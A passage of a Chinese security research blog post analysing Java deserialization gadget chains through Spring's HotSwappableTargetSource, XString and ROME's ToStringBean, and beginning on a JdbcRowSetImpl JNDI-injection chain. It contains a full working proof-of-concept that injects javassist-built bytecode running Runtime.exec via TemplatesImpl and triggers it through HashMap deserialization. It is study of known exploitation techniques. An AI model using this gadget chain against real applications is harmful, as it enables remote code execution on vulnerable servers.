      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>groupId</span><span class="token punctuation">></span></span>org.springframework<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>groupId</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>artifactId</span><span class="token punctuation">></span></span>spring-context<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>artifactId</span><span class="token punctuation">></span></span>
      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>version</span><span class="token punctuation">></span></span>5.3.28<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>version</span><span class="token punctuation">></span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dependency</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="1x01-功能分析"><a href="#1x01-功能分析" class="headerlink" title="1x01  功能分析"></a>1x01  功能分析</h3><p>HotSwappableTargetSource 位于<code>org.springframework.aop.target</code>包下，可以在代理 bean 运行的过程中，动态实时更新 bean 对象，也就是热加载<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711869035520-07bdeb4b-c623-4136-96d2-6f0d37f07d60.png#averageHue=%233a3c41&clientId=u949e3f87-10b5-4&from=paste&height=263&id=u8b1f3e8a&originHeight=493&originWidth=833&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=161998&status=done&style=none&taskId=ua4ee7ae6-8a4f-4afe-86bb-14c24dc268e&title=&width=444.26666666666665" referrerpolicy="no-referrer" alt="image.png"><br>其中的方法大多都是用来对目标 bean 的操作，以及获取 bean 的相关信息为主，至于利用链，我们拼接了它的 equals 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711869111954-aaa5c7d7-5a95-4438-a38a-a98f95373bd1.png#averageHue=%232c2e33&clientId=u949e3f87-10b5-4&from=paste&height=163&id=ud1534675&originHeight=306&originWidth=1374&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=137597&status=done&style=none&taskId=u3c54ae6b-3a22-4e4f-98ec-ace485a8e21&title=&width=732.8" referrerpolicy="no-referrer" alt="image.png"><br>其中 target 值是可控的，直接构造方法中传值进去就行<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711869129950-cca4779b-cef0-4b60-8675-9008b9039487.png#averageHue=%232d3034&clientId=u949e3f87-10b5-4&from=paste&height=164&id=u3014f94e&originHeight=307&originWidth=1338&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=148132&status=done&style=none&taskId=u895e21fa-3996-4915-b646-68e9584c64f&title=&width=713.6" referrerpolicy="no-referrer" alt="image.png"><br>后续的调用涉及到<code>XString</code>这个类，他是关于 Xpath 相关操作的类，具体就不看了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711869290522-bad8fd20-899d-4ae9-b52c-e919c8dcbdda.png#averageHue=%232b2d31&clientId=u949e3f87-10b5-4&from=paste&height=187&id=u0ba7c5c4&originHeight=350&originWidth=1117&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=136388&status=done&style=none&taskId=u3f519660-228b-4839-b9ea-1d56c953eeb&title=&width=595.7333333333333" referrerpolicy="no-referrer" alt="image.png"><br>直接看它的 equals 方法，最终调用到了 obj2 的 toString 方法，这里 obj2 的赋值有点讲究，我们回顾之前 equals 方法的内容，quals 方法的参数是 that.target，并且这个 that 的类型是HotSwappableTargetSource 本身，所以我们这里需要两次实例化不同的HotSwappableTargetSource，第一次实例化构造 target 为 Xstring，第二次实例化新的HotSwappableTargetSource，target 构造为 toStringBean，这样才能保证 obj2 被赋值为 toStringBean<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711871375821-e46c3d30-a76d-4233-aa67-82a8d2bbe1f4.png#averageHue=%232e3135&clientId=u949e3f87-10b5-4&from=paste&height=93&id=u809c6f7c&originHeight=175&originWidth=1259&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=88575&status=done&style=none&taskId=u5a9b1d4b-ca79-4e51-8d3a-045f55a4f7d&title=&width=671.4666666666667" referrerpolicy="no-referrer" alt="image.png"><br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711869355912-e8a51e55-79ae-4799-ac5f-a67315f54e7a.png#averageHue=%232c2e33&clientId=u949e3f87-10b5-4&from=paste&height=443&id=u2594ffa7&originHeight=830&originWidth=1082&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=309669&status=done&style=none&taskId=u1671b95a-c4b8-4dca-9e4b-f89ae39a6dc&title=&width=577.0666666666667" referrerpolicy="no-referrer" alt="image.png"><br>接着后续就是直接调用 toStringBean 的 toString 方法就行</p>
<h3 id="1x02-流程利用分析"><a href="#1x02-流程利用分析" class="headerlink" title="1x02 流程利用分析"></a>1x02 流程利用分析</h3><p>后半段的流程已经分析完毕，现在集中解决上半段触发的问题，此时我脑海中有两种思路，一种是通过 hashmap 的 readObject 作为入口，后续触发putVal 那一条，还有一种思路是通过 HashTable 的 readObject 去触发。两者我都去尝试一下了，hashmap 是肯定是可以的，但是 hashtable 要想触发 euals 方法就必须经过 hash 碰撞，这里不是说我们不能满足 hash 碰撞，而是我们现在的目标类<strong>HotSwappableTargetSource，</strong>他本身就不是 map 类型，导致我们无法”yy”,”zZ”字符串去绕过 hash 碰撞问题，所以暂时只分析 hashmap<br>hashMap 的 readObject 入口，当调用到 putval 方法时，也会在其中调用到 equals 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711869918315-3926bfe2-a06a-4ef7-afa7-53902eb266e9.png#averageHue=%232c2f33&clientId=u949e3f87-10b5-4&from=paste&height=582&id=u21189db8&originHeight=1091&originWidth=1529&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=533274&status=done&style=none&taskId=uc29b43d7-77ac-416d-b41e-9f850080667&title=&width=815.4666666666667" referrerpolicy="no-referrer" alt="image.png"></p>
<h4 id="2x01-hashMap-入口"><a href="#2x01-hashMap-入口" class="headerlink" title="2x01 hashMap 入口"></a>2x01 hashMap 入口</h4><p>调用栈如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">HashMap</span><span class="token punctuation">.</span>readObject
<span class="token class-name">HashMap</span><span class="token punctuation">.</span>putVal
<span class="token class-name">HotSwappableTargetSource</span><span class="token punctuation">.</span>equals
<span class="token class-name">XString</span><span class="token punctuation">.</span>equals
<span class="token class-name">ToStringBean</span><span class="token punctuation">.</span>toString<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>POC 如下：</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xalan<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>xsltc<span class="token punctuation">.</span>trax<span class="token punctuation">.</span></span><span class="token class-name">TemplatesImpl</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>xpath<span class="token punctuation">.</span>internal<span class="token punctuation">.</span>objects<span class="token punctuation">.</span></span><span class="token class-name">XString</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>syndication<span class="token punctuation">.</span>feed<span class="token punctuation">.</span>impl<span class="token punctuation">.</span></span><span class="token class-name">ToStringBean</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">ClassPool</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtClass</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javassist<span class="token punctuation">.</span></span><span class="token class-name">CtConstructor</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">org<span class="token punctuation">.</span>springframework<span class="token punctuation">.</span>aop<span class="token punctuation">.</span>target<span class="token punctuation">.</span></span><span class="token class-name">HotSwappableTargetSource</span></span><span class="token punctuation">;</span>

<span class="token keyword">import</span> <span class="token import"><span class="token namespace">javax<span class="token punctuation">.</span>xml<span class="token punctuation">.</span>transform<span class="token punctuation">.</span></span><span class="token class-name">Templates</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ByteArrayOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectInputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">ObjectOutputStream</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>lang<span class="token punctuation">.</span>reflect<span class="token punctuation">.</span></span><span class="token class-name">Field</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Base64</span></span><span class="token punctuation">;</span>
<span class="token keyword">import</span> <span class="token import"><span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">HashMap</span></span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">HotSwappableTargetSourcePOC</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>

        <span class="token comment">//利用javassist写恶意字节码</span>
        <span class="token class-name">ClassPool</span> pool <span class="token operator">=</span> <span class="token class-name">ClassPool</span><span class="token punctuation">.</span><span class="token function">getDefault</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> ctClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">makeClass</span><span class="token punctuation">(</span><span class="token string">"i"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtClass</span> superClass <span class="token operator">=</span> pool<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        ctClass<span class="token punctuation">.</span><span class="token function">setSuperclass</span><span class="token punctuation">(</span>superClass<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">CtConstructor</span> constructor <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">makeClassInitializer</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        constructor<span class="token punctuation">.</span><span class="token function">setBody</span><span class="token punctuation">(</span><span class="token string">"Runtime.getRuntime().exec(\"calc.exe\");"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> bytes <span class="token operator">=</span> ctClass<span class="token punctuation">.</span><span class="token function">toBytecode</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">//反射对TemplateImpl复制，常规的bytecodes(恶意字节码)  _name _tfactory不为空的限制</span>
        <span class="token class-name">TemplatesImpl</span> templatesImpl <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">TemplatesImpl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_bytecodes"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>bytes<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_name"</span><span class="token punctuation">,</span> <span class="token string">"a"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">setFieldValue</span><span class="token punctuation">(</span>templatesImpl<span class="token punctuation">,</span> <span class="token string">"_tfactory"</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token class-name">ToStringBean</span> toStringBean <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ToStringBean</span><span class="token punctuation">(</span><span class="token class-name">Templates</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">,</span> templatesImpl<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HotSwappableTargetSource</span> h2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HotSwappableTargetSource</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">XString</span><span class="token punctuation">(</span><span class="token string">"x"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">HotSwappableTargetSource</span> h1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HotSwappableTargetSource</span><span class="token punctuation">(</span>toStringBean<span class="token punctuation">)</span><span class="token punctuation">;</span>


        <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">,</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> hashMap <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HashMap</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>h1<span class="token punctuation">,</span>h1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        hashMap<span class="token punctuation">.</span><span class="token function">put</span><span class="token punctuation">(</span>h2<span class="token punctuation">,</span>h2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ByteArrayOutputStream</span> bs <span class="token operator">=</span> <span class="token function">unSerial</span><span class="token punctuation">(</span>hashMap<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token class-name">ByteArrayOutputStream</span> <span class="token function">unSerial</span><span class="token punctuation">(</span><span class="token class-name">Object</span> o<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">ByteArrayOutputStream</span> bs <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ByteArrayOutputStream</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectOutputStream</span> out <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectOutputStream</span><span class="token punctuation">(</span>bs<span class="token punctuation">)</span><span class="token punctuation">;</span>
        out<span class="token punctuation">.</span><span class="token function">writeObject</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">ObjectInputStream</span> in <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ObjectInputStream</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">ByteArrayInputStream</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        in<span class="token punctuation">.</span><span class="token function">readObject</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        in<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> bs<span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token class-name">Base64Encode</span><span class="token punctuation">(</span><span class="token class-name">ByteArrayOutputStream</span> bs<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">byte</span><span class="token punctuation">[</span><span class="token punctuation">]</span> encode <span class="token operator">=</span> <span class="token class-name">Base64</span><span class="token punctuation">.</span><span class="token function">getEncoder</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">encode</span><span class="token punctuation">(</span>bs<span class="token punctuation">.</span><span class="token function">toByteArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">(</span>encode<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">setFieldValue</span><span class="token punctuation">(</span><span class="token class-name">Object</span> obj<span class="token punctuation">,</span> <span class="token class-name">String</span> field<span class="token punctuation">,</span> <span class="token class-name">Object</span> arg<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span><span class="token punctuation">&#123;</span>
        <span class="token class-name">Field</span> f <span class="token operator">=</span> obj<span class="token punctuation">.</span><span class="token function">getClass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDeclaredField</span><span class="token punctuation">(</span>field<span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">setAccessible</span><span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        f<span class="token punctuation">.</span><span class="token function">set</span><span class="token punctuation">(</span>obj<span class="token punctuation">,</span> arg<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>

<span class="token punctuation">&#125;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h5 id="3x01-流程分析"><a href="#3x01-流程分析" class="headerlink" title="3x01 流程分析"></a>3x01 流程分析</h5><p>入口点打在 readObject，然后跟进到 hashmap 的 readobject 方法<br>然后持续跟进到 for 循环处，注意这里的第一次 key 的传值，是 slot_9，也就是我们 POC 中第一次put 的HotSwappableTargetSource<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711873396374-6bc15805-d842-4a5b-b0b9-71c7d44f26c3.png#averageHue=%23343940&clientId=u949e3f87-10b5-4&from=paste&height=554&id=u603227d7&originHeight=1039&originWidth=1937&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=801789&status=done&style=none&taskId=u3bff8252-21c3-4044-a4ae-745a88bebf1&title=&width=1033.0666666666666" referrerpolicy="no-referrer" alt="image.png"><br>然后跟进 putval，来到第二次 if 判断，这里要使 p 不等 null，才能走进 else 内容，触发 equals 方法<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711873613399-a02582fd-e2ee-4630-b7f2-60a799cbcb69.png#averageHue=%2333383e&clientId=u949e3f87-10b5-4&from=paste&height=628&id=ue7ad942e&originHeight=1177&originWidth=1824&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=832850&status=done&style=none&taskId=ua1790ed1-fe26-4a0a-bf99-75994e624e1&title=&width=972.8" referrerpolicy="no-referrer" alt="image.png"><br>但是当前 tab，也就是当前这个 hashmap 所有内容为空，所以不论我们现在 i 算出来多少作为键，tab 中取出的一定是 null，所以第一次进 putval 是无法触发后续链子的，这也是为什么我们 POC 要两次实例化不同的 HotSwappableTargetSource，后续就没有意义了，就是走进 if 判断成功的内容，然后将我们第一个HotSwappableTargetSource（带有XString 实体） 压入临时 tab<br>那么继续第二次 putval 的跟进，此时 i 算出来的键值可以正好在临时 tab 缓存中取到我们刚才压入的 Hot，所以这里 p 取出不为 null，并且由于两次 putval 我们的作用对象都是 HotSwappableTargetSource 类型，两者的 hash 算出来一定是一样的，所以 if 前半段条件也会通过，后续 key 值就是我们第一次 putval 带有 toStringBean 的HotSwappableTargetSource 了，然后 k 值就是我们本次 putval 带有 XString 的 HotSwappableTargetSource<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711873904181-1dfd10b9-17f7-45c2-a1bd-b0a3ac1a363d.png#averageHue=%2333383f&clientId=u949e3f87-10b5-4&from=paste&height=643&id=ub6f19978&originHeight=1205&originWidth=1922&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=964608&status=done&style=none&taskId=u468e8c86-750e-4514-b423-8813c45b421&title=&width=1025.0666666666666" referrerpolicy="no-referrer" alt="image.png"><br>所以这里就可以跟进 equals 方法了<br>(分析到这里时我换了 spring5 版本的依赖，原因是 spring6 肯定不与 jdk8 兼容，升高 jdk 会导致一些类找不到，所以这里权衡之下选择降低 spring 的版本为 5，equals 方法有所区别了，但思路依旧)<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711874343304-f3ad6bed-25b4-4a51-a331-13700fa5248f.png#averageHue=%232e3643&clientId=uac6423a2-4ddb-4&from=paste&height=158&id=uce645cb6&originHeight=297&originWidth=2204&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=215406&status=done&style=none&taskId=ufcce3085-826c-44bf-9bf2-bce9090eb81&title=&width=1175.4666666666667" referrerpolicy="no-referrer" alt="image.png"><br>那么这里就开始调用 Xstring 的 equals 方法了，obj2 被构造为了 toStringBean<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711874676767-4b3f97cc-fd96-45ae-b91c-a671f22986fa.png#averageHue=%232b3037&clientId=uac6423a2-4ddb-4&from=paste&height=373&id=u996bd242&originHeight=700&originWidth=1456&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=278454&status=done&style=none&taskId=u5cf4acb5-d220-4ff8-a529-ec26d6ab3b3&title=&width=776.5333333333333" referrerpolicy="no-referrer" alt="image.png"><br>后续就是 toStringBean 熟悉的流程了，不跟进了</p>
<h2 id="0x05-JdbcRowSetImpl利用链"><a href="#0x05-JdbcRowSetImpl利用链" class="headerlink" title="0x05 JdbcRowSetImpl利用链"></a>0x05 JdbcRowSetImpl利用链</h2><p>相信之前 fastjson 利用的时候应该很熟悉了，只不过利用点完全不同，fastjson 是利用的 set 方法，RMOE 中只会调用 get 方法，所以这里是调用其 get 方法触发的<br>这个 get 方法是getDatabaseMetaData，他调用了 connect 方法了<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711876721948-a2ad57f7-d875-4643-970d-f9a58d8327f9.png#averageHue=%232e3138&clientId=u4731c904-8da4-4&from=paste&height=142&id=u5d4a42ed&originHeight=266&originWidth=1419&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=124349&status=done&style=none&taskId=u869ff25d-5869-4e83-867d-e9c23d7726e&title=&width=756.8" referrerpolicy="no-referrer" alt="image.png"><br>又是熟悉的调用<code>InitialContext</code>的 lookup 方法引起的 JNDI 注入标记<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711876783204-550fe907-c7a6-4716-b254-4fc193a9455c.png#averageHue=%232d3034&clientId=u4731c904-8da4-4&from=paste&height=311&id=u2772e2b1&originHeight=583&originWidth=2215&originalType=binary&ratio=1.875&rotation=0&showTitle=false&size=367753&status=done&style=none&taskId=ud83d7be2-e200-48e1-b2bb-b6ca6f159d9&title=&width=1181.3333333333333" referrerpolicy="no-referrer" alt="image.png"><br>lookup 里面的参数我们保证可控，跟进 getDataSourceName<br>到了父类 BaseRowSet 的 getDataSourceName 方法， 他直接返回 dataSource 属性<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://cdn.nlark.com/yuque/0/2024/png/36078896/1711882289729-34eba56f-e416-4c6b-a4e1-5f38a3a052e3.png#averageHue=%232d3035&clientId=u9f9b8bcd-7272-4&from=paste&height=118&id=u714d0827&originHeight=221&originWidth=995&originalType=binary&ratio=1.5&rotation=0&showTitle=false&size=79349&status=done&style=none&taskId=u92b70d46-6487-47c7-883a-6237038deb5&title=&width=530.6666666666666" referrerpolicy="no-referrer" alt="image.png"><br>这里 dataSource 属性的设定依然还是要调用到 JdbcRowImpl 的setDataSourceName 方法，然后调用回 BaseRowSet 的setDataSourceName<br><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" 